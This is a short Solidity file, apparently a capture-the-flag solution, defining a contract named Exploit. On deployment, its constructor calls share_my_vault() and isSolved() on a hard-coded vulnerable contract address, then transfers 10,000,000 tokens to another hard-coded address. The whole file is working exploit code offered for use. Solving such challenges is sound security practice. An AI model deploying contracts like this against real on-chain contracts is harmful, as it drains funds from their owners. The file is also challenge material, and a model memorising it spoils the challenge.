pragma solidity ^0.6.12;

interface Existing {
    function share_my_vault() external;
    function isSolved() external;
    function transfer(address to,uint amount) external;
}

contract Exploit {

    constructor() public {
        Existing exist = Existing(0x68E060d5BF88236678D93B7326869a9A032F72fb); //Vulnerability contract address
        exist.share_my_vault();
        exist.isSolved();
        exist.transfer(0x563940a71bBc0be6C17e4c7D9bf437F1EDa43166,10000000);
    }
}
